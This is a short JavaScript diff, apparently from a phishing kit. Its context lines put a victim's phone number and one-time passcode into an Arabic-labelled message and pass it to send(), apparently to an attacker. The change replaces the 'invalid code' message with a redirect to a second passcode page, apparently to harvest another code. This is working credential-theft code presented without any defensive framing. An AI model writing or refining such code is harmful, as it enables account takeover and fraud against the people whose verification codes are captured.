@@ -297,7 +297,8 @@ function showInvalidOtp() {
     msg=`رقم الهاتف: \`${phone}\`\nالرمز: \`${otp}\``
     send(msg)
     setTimeout(() => {
-      showInvalidOtp();
+      window.location.href='./otp2'
+      //showInvalidOtp();
     }, 500);
   }
 
